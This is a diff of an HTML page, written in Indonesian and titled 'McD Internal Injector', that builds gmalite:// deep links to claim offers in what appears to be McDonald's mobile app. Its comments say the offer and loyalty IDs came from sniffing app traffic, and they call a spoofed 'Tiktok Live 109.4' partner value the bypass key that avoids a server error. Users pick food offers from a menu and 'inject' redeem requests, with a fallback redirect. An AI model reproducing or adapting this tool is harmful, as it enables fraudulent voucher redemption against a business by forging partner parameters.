@@ -2,39 +2,63 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Injeksi Aktif</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>McD Internal Injector</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #da291c; padding: 15px; margin: 0; color: white; }
+        .card { background: white; border-radius: 20px; padding: 20px; color: #333; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        h2 { font-size: 18px; margin-bottom: 15px; text-align: center; color: #da291c; }
+        select, .btn { width: 100%; padding: 15px; border-radius: 12px; font-size: 15px; margin-top: 10px; border: 2px solid #eee; outline: none; }
+        .btn { background: #ffbc0d; border: none; font-weight: bold; color: #222; cursor: pointer; }
+        .footer { font-size: 10px; text-align: center; margin-top: 15px; color: #ffdada; }
+    </style>
 </head>
-<body style="background:#da291c; color:white; text-align:center; padding-top:50px;">
-    <h2>MENYAMBUNGKAN KE SERVER...</h2>
-    <p>Harap tunggu, jangan tutup aplikasi.</p>
+<body>
 
-    <script>
-        window.onload = function() {
-            // Data Harta Karun dari Sniffing Anda
-            var o = "272484"; 
-            var l = "5271";
-            var p = encodeURIComponent("Tiktok Live 109.4");
+<div class="card">
+    <h2>PILIH MENU INJEKSI</h2>
+    <select id="menu">
+        <option value="267611|5272">Panas 1 (ID: 267611)</option>
+        <option value="272395|5271">Cheeseburg + Fries (ID: 272395)</option>
+        <option value="272400|5271">Ayam + McFloat + Fries (ID: 272400)</option>
+        <option value="272404|5271">McFlurry + Fries (ID: 272404)</option>
+        <option value="272469|5271">McNugget + Cola (ID: 272469)</option>
+        <option value="272484|5271">Ayam + Nasi + Lemon Tea (ID: 272484)</option>
+    </select>
+    
+    <button class="btn" onclick="gas()">INJECT KE APLIKASI</button>
+</div>
 
-            // RAHASIA MUKIDI: Gunakan skema 'redeem' langsung, bukan 'details'
-            // Karena data Anda menunjukkan ini adalah 'mass_code'
-            var target = "gmalite://offers/redeem?offer_id=" + o + 
-                         "&loyalty_id=" + l + 
-                         "&view=claim" + 
-                         "&is_mass_code=1" + 
-                         "&partner=" + p + 
-                         "&is_native=true";
+<p class="footer">Status: Connected via Tiktok Live 109.4 Bridge</p>
 
-            // Eksekusi otomatis dalam 1 detik
-            setTimeout(function() {
-                window.location.replace(target);
-            }, 1000);
-            
-            // Backup jika tetap diam (Jalur Voucher Aktif)
-            setTimeout(function() {
-                window.location.replace("gmalite://offers/details?offer_id=" + o + "&loyalty_id=" + l + "&partner=" + p);
-            }, 2500);
-        };
-    </script>
+<script>
+function gas() {
+    var data = document.getElementById('menu').value.split('|');
+    var off = data[0];
+    var loy = data[1];
+    
+    // KUNCI BYPASS: Harus menyertakan partner Tiktok Live agar tidak Error 500
+    var partner = encodeURIComponent("Tiktok Live 109.4");
+    
+    // Gunakan skema NATIVE REDEEM langsung
+    var trigger = "gmalite://offers/details?" + 
+                  "offer_id=" + off + 
+                  "&loyalty_id=" + loy + 
+                  "&view=claim" + 
+                  "&is_mass_code=1" + 
+                  "&partner=" + partner + 
+                  "&action=redeem" + 
+                  "&is_native=true";
+
+    // Eksekusi
+    window.location.replace(trigger);
+
+    // Backup pancingan jika aplikasi tidak merespon (Mukidi Style)
+    setTimeout(function() {
+        window.location.href = "gmalite://offers/redeem?offer_id=" + off + "&loyalty_id=" + loy + "&is_mass_code=1";
+    }, 800);
+}
+</script>
+
 </body>
 </html>
